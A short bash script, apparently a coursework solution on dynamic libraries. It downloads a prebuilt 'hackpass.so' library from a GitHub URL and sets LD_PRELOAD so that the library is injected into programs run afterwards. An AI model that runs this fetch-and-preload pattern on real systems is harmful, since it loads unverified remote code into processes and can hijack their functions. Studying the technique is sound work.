#!/bin/bash
wget -O $PWD/hackpass.so https://raw.github.com/franklinobasy/alx-low_level_programming/main/0x18-dynamic_libraries/hackpass.so
export LD_PRELOAD="$PWD/hackpass.so"
